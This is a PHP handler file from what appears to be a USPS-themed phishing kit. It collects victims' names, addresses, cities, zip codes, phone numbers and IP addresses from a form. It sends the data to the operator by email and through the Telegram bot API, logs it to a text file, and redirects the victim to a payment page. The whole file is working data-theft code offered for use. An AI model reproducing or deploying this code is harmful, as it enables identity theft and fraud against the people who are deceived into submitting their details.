﻿<?php
/*

  /$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$        /$$$$$$$   /$$$$$$   /$$$$$$ 
 /$$__  $$| $$__  $$| $$__  $$ /$$__  $$| $$$ | $$ /$$__  $$      | $$__  $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$| $$$$| $$| $$  \ $$      | $$  \ $$| $$  \ $$| $$  \__/
| $$$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$/| $$ $$ $$| $$  | $$      | $$  | $$| $$$$$$$$|  $$$$$$ 
| $$__  $$| $$__  $$| $$  | $$ >$$__  $$| $$  $$$$| $$  | $$      | $$  | $$| $$__  $$ \____  $$
| $$  | $$| $$  \ $$| $$  | $$| $$  \ $$| $$\  $$$| $$  | $$      | $$  | $$| $$  | $$ /$$  \ $$
| $$  | $$| $$  | $$| $$$$$$$/|  $$$$$$/| $$ \  $$|  $$$$$$/      | $$$$$$$/| $$  | $$|  $$$$$$/
|__/  |__/|__/  |__/|_______/  \______/ |__/  \__/ \______/       |_______/ |__/  |__/ \______/ 
                                                                                                
                                                                                                
                                                                                                

*/
error_reporting(0);
session_start();
include "../../email.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(
	($_POST['fullname'] != "") AND ($_POST['add1'] != "") AND ($_POST['city'] != "") AND ($_POST['zipp'] != "") AND ($_POST['phonee'] != "") )
{
	$_SESSION["name"]= $_POST['fullname'];

$hostname = gethostbyaddr($ip);
$message = "[====brain=====]\r\n";
$message .= "name: ".$_POST['fullname']."\r\n";
$message .= "adress: ".$_POST['add1']."\r\n";
$message .= "City: ".$_POST['city']."\r\n";
$message .= "zip : ".$_POST['zipp']."\r\n";
$message .= "Phone : ".$_POST['phonee']."\r\n";
$message .= "= $ip = \r\n";
$send = $email; 
$subject = "(".$_POST['fullname'].") rezlt $ip";
$headers = "From: [floritynardo **]<info@braindrai.com>";
mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$save=fopen("../../brain.txt","a+");
fwrite($save,$message);
fclose($save);
include "../files/oldusps.gif";
echo"<script>location.replace('../payment.php');</script>";
}else{echo"error sending";}

?>
